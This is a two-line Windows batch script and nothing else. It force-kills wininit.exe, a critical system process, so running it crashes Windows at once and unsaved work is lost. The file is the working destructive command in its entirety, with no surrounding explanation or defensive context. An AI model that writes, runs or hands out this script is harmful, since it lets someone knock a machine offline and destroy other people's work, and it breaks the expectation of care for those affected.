@echo off
taskkill /f /im wininit.exe